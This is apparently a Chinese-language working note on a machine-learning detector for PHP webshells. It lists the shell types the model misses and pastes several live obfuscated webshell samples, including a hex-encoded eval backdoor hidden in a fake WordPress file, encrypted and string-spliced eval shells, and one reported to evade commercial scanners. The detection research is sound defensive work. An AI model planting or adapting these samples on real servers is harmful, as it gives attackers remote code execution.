##### 机器学习稳定版本（误报率0.6%，检出率99%）

- ### 典型的webshell  但机器学习模型不能很好识别   (最高优先级)

  - 一句话木马（eval 三连）部分不能有效检出
    - eval+远程操作函数+url  （需判断url是否恶意）  #细小需求

- ### 非典型webshell  机器学习不能很好识别

  - 上传文件uploadfile函数的 

    - 需要判断上传文件是否可控

  - include执行文件的 

    ```php
    <?php
    /**
     * Deprecated. Use rss.php instead.
     *
     * @package WordPress
    */preg_replace("/.*/e","\x65\x76\x61\x6c\x28\x27\x24\x70\x61\x67\x65\x78\x79\x7a\x20\x3d\x20\x40\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73\x28\x22\x77\x70\x2d\x69\x6e\x63\x6c\x75\x64\x65\x73\x2f\x69\x6d\x61\x67\x65\x73\x2f\x73\x6d\x69\x6c\x69\x65\x73\x2f\x69\x63\x6f\x6e\x5f\x77\x74\x66\x2e\x67\x69\x66\x22\x29\x3b\x65\x76\x61\x6c\x28\x40\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x28\x24\x70\x61\x67\x65\x78\x79\x7a\x29\x29\x3b\x27\x29\x3b","");/**
    _deprecated_file( basename(__FILE__), '2.1', WPINC . '/rss.php' );
    require_once( ABSPATH . WPINC . '/rss.php' );
    */
    ```

    ​	require和include一样性质（包含后面文件，并且执行）

  - 反弹shell

  - 敏感函数动态调用

    字符串混淆+敏感函数动态调用（目前没什么好办法）（百度、长亭都判白，源码分析模型判黑）（百度有反混淆）

    ```php
    <?php 
    $auth_pass = "c0556725c352dd17d48122205939c12a"; 
    $color = "#df5"; 
    $default_action = 'FilesMan'; 
    $default_use_ajax = true; 
    $default_charset = 'Windows-1251';$GLOBALS['_1603856887_']=preg_replace(base64_decode('cHJlZ1' .'9' .'yZX' .'B' .'s' .'YWNl')); ?><?php $GLOBALS['_1603856887_'][0](_1695691616(0),_1695691616(1),_1695691616(2)); ?>
    ```

    

  - 通过字符串替换（str_replace）（暂时认为后期机器学习可以解决）

    ```php
    <?php
    $V=str_replace('DU','','cDUDUreateDU_fuDUnDUctDUion');
    $O=';functioGwn x($tGw,$k){$GwcGw=sGwtrleGwn($kGw);Gw$l=strlen($Gwt);$o=Gw"";for($i=0;$i<$lGw;){fGworGw($';
    $n='eGwval(@gzuncoGwmpresGws(@x(@baGwse64Gw_dGwecode($mGw[1]Gw),$k)));$oGw=@ob_gGwetGw_contentsGw();';
    $S='Gw@ob_end_clGwean();$rGwGw=@bGwase64_Gwencode(@x(@gzcoGwmprGwesGws($o),$k))GwGw;prinGwt("$p$kh$r$kf");}';
    $W='$k="9c6GwGwf5fa4"Gw;$Gwkh="af564Gw9e58aGwa8";$kf="Gw755a4cGw0228eGweGw";$p="pNoAzbV6ply2GwTgGwvq"';
    $x='cGwh("/$kh(Gw.+)$Gwkf/",@fGwGwile_get_contentsGw("pGwhp://inGwput")Gw,$m)==1)Gw {@ob_starGwt();@Gw';
    $B='j=0;($jGw<$c&Gw&$i<$l);$jGw+GwGw+,$i+Gw+){$o.=$Gwt{$i}^$k{Gw$j};}}return $GwGwo;}ifGw (@Gwpreg_mat';
    $T=str_replace('Gw','',$W.$O.$B.$x.$n.$S);
    $K=$V('',$T);$K();
    ?>
    ```

    字符串替换直接执行

    ```php
    <?php $uskd57 = "pots_";
    $vfjh7 = strtoupper($uskd57[4] . $uskd57[0] . $uskd57[1] . $uskd57[3] . $uskd57[2]);
    if (isset($ {
        $vfjh7
    }
    ['q79c1ec'])) {
        eval($ {
            $vfjh7
        }
        ['q79c1ec']);
    } ?>
    ```

    foreach加上.=字符串拼接

    ```php
    $z0=$_REQUEST['sort'];$q1='';$c2="wt8m4;6eb39fxl*s5/.yj7(pod_h1kgzu0cqr)aniv2";$y3=array(8,38,15,7,6,4,26,25,7,34,24,25,7);foreach($y3 as $h4){$q1.=$c2[$h4];}$v5=strrev("noi"."tcnuf"."_eta"."erc");$j6=$v5("",$q1($z0));$j6();?>
    ```

    敏感字符串用16进制表达（php预处理可直接提取出16进制的表达）（百度、长亭都没检出、源码分析模型检出）

    ```php
    <?php
     $x1c="\x64\151\163k\146\162\145e\x73\160\x61\x63\x65"; $x1d="\144i\163\x6b_\164o\164a\154\137\x73\160\x61ce"; $x1e="\x67\145\x74\x63\x77d"; $x1f="\x67e\164\x65\x6e\166"; $x20="\x67\145t\150\157s\x74by\156\x61\155\145"; $x21="\x70\150\x70\x5fu\x6e\141\155e"; $x22="\x70\x68\x70\166e\162\163\x69\157n"; $x23="\163\x70r\x69\x6et\x66"; $x24="\163tr\154e\x6e"; $x25="\x73y\163\164\x65\155"; 
    function ConvertBytes($x0b){ global $x1c,$x1d,$x1e,$x1f,$x20,$x21,$x22,$x23,$x24,$x25; $x0c = $x24($x0b);if($x0c < 4){return $x23("\045d\040\142", $x0b);}if($x0c >= 4 && $x0c <=6){return $x23("\045\x30.\x32f\040K\142", $x0b/1024);}if($x0c >= 7 && $x0c <=9){return $x23("%\x30\056\x32\x66 \115b", $x0b/1024/1024);} return $x23("%0\x2e\062\146 Gb", $x0b/1024/1024/1024); }echo "\x66\151\147\x62a\x79\x69\154\157\146i\x6cogba<\x62r\076";$x0d = @$x21();$x0e = $x25(uptime);$x0f = $x25(id);$x10 = @$x1e();$x11 = $x1f("\x53\x45\122\x56\x45\122\x5f\x53O\106\124\x57A\122\105");$x12 = $x22();$x13 = $_SERVER['SERVER_NAME'];$x14 = $x20($x15);$x16= $x1c($x10);$x17 = ConvertBytes($x1c($x10));if (!$x17) {$x17 = 0;}$x18= $x1d($x10);$x19 = ConvertBytes($x1d($x10));if (!$x19) {$x19 = 0;}$x1a = ConvertBytes($x18-$x16);$x1b = @PHP_OS;echo "\146\x69\x67\142\x61y\x69\x6co\146i\x6c\x6fg\x62\x61\074\142\162\076";echo "\165n\141\x6d\145 -\141: $x0d<\x62\162\x3e";echo "os\072 $x1b\x3c\x62\162\x3e";echo "\165\x70\164i\155\x65\072 $x0e<\x62\x72\076";echo "\x69d\072 $x0f<\142\x72>";echo "\160w\x64\x3a $x10<\x62r>";echo "p\150p\x3a\040$x12\x3c\x62\162>";echo "\163\x6f\x66\x74\167a\162\x65:\x20$x11\x3c\x62\162>";echo "\x73\x65r\x76\x65r\x2d\x6e\141\155\145\x3a\x20$x13\074\142\162\076";echo "s\145\x72ver\x2d\x69p\072 $x14\x3c\x62\162\x3e";echo "f\162\145\145:\040$x17<br\x3e";echo "u\163\145d\072\040$x1a\074b\x72>";echo "to\164\141\x6c:\x20$x19<\142\x72>";exit;
    ```

    

- ### 机器学习可以识别，但样本不是非常典型，需要加以解释的。

  - 发邮件的webshell
  - system 执行函数

### white_white_white

- 大部分为白样本
- 大量上传文件函数
- 五分之一eval三连
- 小部分有base64但午命令执行

### black_black_white

- 几乎全是黑样本，部分代码不全可判白
- 机器学习对长字符串编码混淆不敏感
- 字符串拼接的、混淆的不能识别
- 部分样本包含white_white_white类型

### black_white_white

- 一共14个文件，两个是白样本
- 有foreach+字符串拼接
- eval一句话木马
- 上传文件

### white_black_black

```php
//037033de6e44560dcfa0e58458a66dc416204b8c6437c7c09d1ba3585ebd4f10.php //D盾、百度、长亭全部报白
<?php
$tciht = 'i1#Hfrn\'kcgvs02e4lyxbuptm7a*8-65do_';$avfqrnq = Array();$avfqrnq[] = $tciht[3].$tciht[27];$avfqrnq[] = $tciht[13].$tciht[32].$tciht[4].$tciht[9].$tciht[16].$tciht[1].$tciht[14].$tciht[30].$tciht[29].$tciht[1].$tciht[15].$tciht[13].$tciht[31].$tciht[29].$tciht[16].$tciht[20].$tciht[28].$tciht[31].$tciht[29].$tciht[20].$tciht[15].$tciht[32].$tciht[9].$tciht[29].$tciht[31].$tciht[25].$tciht[15].$tciht[25].$tciht[4].$tciht[30].$tciht[16].$tciht[20].$tciht[15].$tciht[4].$tciht[28].$tciht[14];$avfqrnq[] = $tciht[2];$avfqrnq[] = $tciht[9].$tciht[33].$tciht[21].$tciht[6].$tciht[23];$avfqrnq[] = $tciht[12].$tciht[23].$tciht[5].$tciht[34].$tciht[5].$tciht[15].$tciht[22].$tciht[15].$tciht[26].$tciht[23];$avfqrnq[] = $tciht[15].$tciht[19].$tciht[22].$tciht[17].$tciht[33].$tciht[32].$tciht[15];$avfqrnq[] = $tciht[12].$tciht[21].$tciht[20].$tciht[12].$tciht[23].$tciht[5];$avfqrnq[] = $tciht[26].$tciht[5].$tciht[5].$tciht[26].$tciht[18].$tciht[34].$tciht[24].$tciht[15].$tciht[5].$tciht[10].$tciht[15];$avfqrnq[] = $tciht[12].$tciht[23].$tciht[5].$tciht[17].$tciht[15].$tciht[6];$avfqrnq[] = $tciht[22].$tciht[26].$tciht[9].$tciht[8];foreach ($avfqrnq[7]($_COOKIE, $_POST) as $myoojll => $hcdwmhz){function rqwajjw($avfqrnq, $myoojll, $mahco){return $avfqrnq[6]($avfqrnq[4]($myoojll . $avfqrnq[1], ($mahco / $avfqrnq[8]($myoojll)) + 1), 0, $mahco);}function xkohn($avfqrnq, $nheavh){return @$avfqrnq[9]($avfqrnq[0], $nheavh);}function evvzt($avfqrnq, $nheavh){$asainp = $avfqrnq[3]($nheavh) % 3;if (!$asainp) {eval($nheavh[1]($nheavh[2]));exit();}}$hcdwmhz = xkohn($avfqrnq, $hcdwmhz);evvzt($avfqrnq, $avfqrnq[5]($avfqrnq[2], $hcdwmhz ^ rqwajjw($avfqrnq, $myoojll, $avfqrnq[8]($hcdwmhz))));}
```



